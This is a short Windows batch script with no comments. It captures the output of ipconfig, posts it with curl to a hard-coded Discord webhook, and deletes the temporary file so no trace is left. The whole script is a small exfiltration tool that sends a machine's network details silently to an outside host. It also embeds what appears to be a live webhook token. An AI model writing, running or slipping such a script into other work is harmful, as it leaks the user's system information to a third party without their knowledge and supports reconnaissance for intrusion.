@echo off
setlocal

set "WEBHOOK_URL=https://discord.com/api/webhooks/1381341130779660298/9Cq3qdp2LtdD4-nC56yCnVAt3JNdacPfEYZfo5T9zzLca6ZqW256rS6NdG-N4H2k39dv"

ipconfig > ipconfig.txt

set /p content=<ipconfig.txt
curl -H "Content-Type: application/json" -X POST ^
  -d "{\"content\": \"`ipconfig` result:\n```\n%content%\n```\"}" ^
  %WEBHOOK_URL%

del ipconfig.txt
endlocal
